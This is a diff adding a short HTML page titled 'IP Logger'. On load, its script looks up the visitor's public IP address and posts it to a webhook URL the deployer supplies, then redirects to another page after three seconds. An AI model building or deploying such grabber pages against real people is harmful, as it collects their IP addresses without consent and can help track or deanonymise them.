@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
+    <meta http-equiv="refresh" content="3;url=MAINPAGE.html" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+        var webHookUrl = "YOUR_WEBHOOK_URL_HERE"; // Replace with your webhook URL
+
+        $.getJSON("https://api.ipify.org?format=json", function(data) {
+            var ip = data.ip;
+            $.post(webHookUrl, JSON.stringify({
+                content: "New visitor IP: " + ip
+            }), {
+                contentType: "application/json"
+            });
+        });
+    </script>
+</head>
+<body>
+    <h1>Logging your IP...</h1>
+</body>
+</html>
